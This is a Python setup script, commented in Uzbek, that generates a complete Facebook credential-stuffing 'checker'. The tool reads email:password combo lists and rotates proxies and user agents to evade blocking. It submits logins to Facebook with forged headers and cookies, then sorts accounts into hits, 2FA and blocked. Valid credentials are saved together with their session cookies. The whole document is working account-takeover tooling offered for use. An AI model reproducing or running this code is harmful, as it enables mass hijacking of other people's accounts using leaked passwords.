# setup.py
# Facebook checker uchun barcha fayllarni yaratadi.
# Ishga tushirish: python setup.py

import os

FILES = {
    "requirements.txt": """httpx[http2]
""",

    "config.py": """# config.py
CONCURRENCY = 10
TIMEOUT = 40.0
PROXY_FILE = "proxies.txt"
COMBO_FILE = "combos.txt"
OUTPUT_DIR = "output"
""",

    "proxies.txt": """# host:port:user:pass
# Har bir qatorda bitta proxy
""",

    "combos.txt": """# email:parol
# Har bir qatorda bitta Facebook hisob
""",

    "core/__init__.py": "",

    "core/http.py": '''# core/http.py
import httpx
import random
import asyncio
from typing import Optional

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
]


class HTTPPool:
    def __init__(self, proxies: list[str] | None = None):
        self.proxies = proxies or []
        self._clients: dict[str, httpx.AsyncClient] = {}
        self._lock = asyncio.Lock()

    def _ua(self) -> str:
        return random.choice(USER_AGENTS)

    def _proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        raw = random.choice(self.proxies)
        return self._parse_proxy(raw)

    @staticmethod
    def _parse_proxy(raw: str) -> str:
        raw = raw.strip()
        if not raw:
            return raw
        if "://" in raw:
            return raw
        if "##" in raw:
            parts = raw.split("##")
            if len(parts) == 3:
                host_port, user, pw = parts
                return f"http://{user}:{pw}@{host_port}"
        if "@" in raw:
            left, right = raw.split("@", 1)
            lp = left.split(":")
            rp = right.split(":")
            if len(lp) == 2 and len(rp) == 2:
                if lp[1].isdigit():
                    return f"http://{right}@{left}"
                return f"http://{left}@{right}"
        parts = raw.split(":")
        if len(parts) == 4:
            a, b, c, d = parts
            if b.isdigit():
                return f"http://{c}:{d}@{a}:{b}"
        if len(parts) == 2:
            return f"http://{raw}"
        return raw

    async def client(self, proxy: Optional[str] = None) -> httpx.AsyncClient:
        key = proxy or "__direct__"
        async with self._lock:
            if key not in self._clients:
                kwargs = {
                    "http2": True,
                    "timeout": 40.0,
                    "follow_redirects": True,
                    "verify": False,
                }
                if proxy:
                    kwargs["proxy"] = proxy
                self._clients[key] = httpx.AsyncClient(**kwargs)
            return self._clients[key]

    async def get(self, url: str, **kwargs) -> httpx.Response:
        proxy = self._proxy()
        client = await self.client(proxy)
        headers = kwargs.pop("headers", {})
        headers.setdefault("User-Agent", self._ua())
        return await client.get(url, headers=headers, **kwargs)

    async def post(self, url: str, **kwargs) -> httpx.Response:
        proxy = self._proxy()
        client = await self.client(proxy)
        headers = kwargs.pop("headers", {})
        headers.setdefault("User-Agent", self._ua())
        return await client.post(url, headers=headers, **kwargs)

    async def close(self):
        for c in self._clients.values():
            await c.aclose()
        self._clients.clear()
''',

    "core/checker.py": '''# core/checker.py
import asyncio
from dataclasses import dataclass, field


@dataclass
class Credential:
    email: str
    password: str


@dataclass
class CheckResult:
    cred: Credential
    status: str
    modules: dict = field(default_factory=dict)
    raw: dict = field(default_factory=dict)

    def __str__(self):
        return f"{self.status} | {self.cred.email}:{self.cred.password}"


class Checker:
    def __init__(self, pool, modules: list, concurrency: int = 10):
        self.pool = pool
        self.modules = modules
        self.sem = asyncio.Semaphore(concurrency)

    def _module(self, name: str):
        for m in self.modules:
            if m.name == name:
                return m
        raise KeyError(f"Modul topilmadi: {name}")

    async def check_one(self, cred: Credential) -> CheckResult:
        async with self.sem:
            try:
                mod = self.modules[0]
                result_data = await mod.run(cred, self.pool)
            except Exception as e:
                return CheckResult(
                    cred=cred,
                    status="ERROR",
                    raw={"error": type(e).__name__, "detail": str(e)[:200]},
                )

            status = result_data.get("status", "ERROR")
            return CheckResult(
                cred=cred,
                status=status,
                modules={mod.name: result_data},
                raw=result_data,
            )

    async def run(self, creds: list[Credential]):
        tasks = [self.check_one(c) for c in creds]
        for coro in asyncio.as_completed(tasks):
            yield await coro
''',

    "modules/__init__.py": "",

    "modules/facebook.py": '''# modules/facebook.py
# Facebook login checker. HIT / 2FA / BAD / BLOCKED aniqlaydi.

import base64
import json
import time
from core.checker import Credential


class Facebook:
    name = "facebook"

    LOGIN_URL = "https://www.facebook.com/login/"

    STATIC_COOKIES = "datr=rYw9aMMrvaIwTjzB3UvpfCBW; sb=rYw9aFQhwkp-k36jr7BlNegU;"

    async def run(self, cred: Credential, pool, session=None) -> dict:
        timestamp = int(time.time())
        session_payload = {
            "type": 0,
            "creation_time": timestamp,
            "callsite_id": 381229079575946,
        }
        enctoken = base64.b64encode(
            json.dumps(session_payload, separators=(",", ":")).encode()
        ).decode()

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": self.STATIC_COOKIES,
            "Host": "www.facebook.com",
            "Origin": "https://www.facebook.com",
            "Referer": "https://www.facebook.com/",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        }

        data = {
            "jazoest": "2933",
            "lsd": "AVq53wqah7M",
            "email": cred.email,
            "login_source": "comet_headerless_login",
            "next": "",
            "encpass": f"#PWD_INSTAGRAM:0:{timestamp}:{cred.password}",
        }

        params = {
            "privacy_mutation_token": enctoken,
            "next": "",
        }

        try:
            r = await pool.post(
                self.LOGIN_URL,
                params=params,
                headers=headers,
                data=data,
            )
        except Exception as e:
            return {"status": "ERROR", "detail": type(e).__name__}

        html = r.text
        cookies = r.cookies

        # Invalid credentials
        if (
            "password that you've entered is incorrect" in html
            or "Invalid username or password" in html
            or "The password you entered is incorrect" in html
            or "entered an incorrect password" in html
        ):
            return {"status": "BAD", "detail": "invalid_credentials"}

        # 2FA / Checkpoint
        if (
            "CheckpointDefaultSettingsDropdown" in html
            or "checkpoint" in html.lower()
            or "two-factor" in html.lower()
            or "approvals_code" in html.lower()
        ):
            return {"status": "2FA", "detail": "checkpoint_required"}

        # Valid login
        if "c_user" in cookies:
            return {
                "status": "HIT",
                "detail": "login_success",
                "c_user": cookies.get("c_user"),
                "xs": cookies.get("xs"),
            }

        # Blocked
        if (
            "You're Temporarily Blocked" in html
            or "temporarily blocked" in html.lower()
        ):
            return {"status": "BLOCKED", "detail": "temporarily_blocked"}

        if r.status_code == 429:
            return {"status": "RATE", "detail": "rate_limited"}

        return {
            "status": "ERROR",
            "detail": f"unknown_response_{r.status_code}",
        }
''',

    "main.py": '''# main.py
import asyncio
import sys
import os
import json
from config import PROXY_FILE, CONCURRENCY, OUTPUT_DIR
from core.http import HTTPPool
from core.checker import Checker, Credential
from modules.facebook import Facebook


def load_combos(path: str) -> list[Credential]:
    creds = []
    with open(path, "r", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            for sep in (":", "|", ";"):
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and "@" in parts[0]:
                        creds.append(Credential(parts[0].strip(), parts[1].strip()))
                        break
    return creds


def load_proxies(path: str) -> list[str]:
    if not os.path.exists(path):
        return []
    with open(path) as f:
        return [l.strip() for l in f if l.strip() and not l.startswith("#")]


async def main():
    if len(sys.argv) < 2:
        print("usage: python main.py combos.txt")
        sys.exit(1)

    combo_file = sys.argv[1]
    if not os.path.exists(combo_file):
        print(f"Fayl topilmadi: {combo_file}")
        sys.exit(1)

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    creds = load_combos(combo_file)
    proxies = load_proxies(PROXY_FILE)
    print(f"[+] {len(creds)} credential, {len(proxies)} proxy")

    pool = HTTPPool(proxies=proxies)

    modules = [Facebook()]

    checker = Checker(pool, modules, concurrency=CONCURRENCY)

    hits_file = open(f"{OUTPUT_DIR}/hits.txt", "a")
    twofa_file = open(f"{OUTPUT_DIR}/2fa.txt", "a")
    all_file = open(f"{OUTPUT_DIR}/all.txt", "a")
    full_file = open(f"{OUTPUT_DIR}/full.jsonl", "a")

    try:
        async for result in checker.run(creds):
            line = str(result)
            print(line)
            all_file.write(line + "\\n")
            all_file.flush()

            if result.status == "HIT":
                hits_file.write(f"{result.cred.email}:{result.cred.password}\\n")
                hits_file.flush()

            if result.status == "2FA":
                twofa_file.write(f"{result.cred.email}:{result.cred.password}\\n")
                twofa_file.flush()

            full_file.write(json.dumps({
                "email": result.cred.email,
                "password": result.cred.password,
                "status": result.status,
                "modules": result.modules,
            }, default=str) + "\\n")
            full_file.flush()
    finally:
        hits_file.close()
        twofa_file.close()
        all_file.close()
        full_file.close()
        await pool.close()


if __name__ == "__main__":
    asyncio.run(main())
''',
}


def main():
    print("[*] Facebook checker fayllari yaratilmoqda...")
    for path, content in FILES.items():
        dir_name = os.path.dirname(path)
        if dir_name:
            os.makedirs(dir_name, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"    [+] {path}")

    os.makedirs("output", exist_ok=True)
    print("    [+] output/")

    print()
    print("[*] Tayyor. Endi:")
    print("    1. pip install -r requirements.txt")
    print("    2. proxies.txt ga proxylarni yozing")
    print("    3. combos.txt ga Facebook hisoblarni yozing")
    print("    4. python main.py combos.txt")


if __name__ == "__main__":
    main()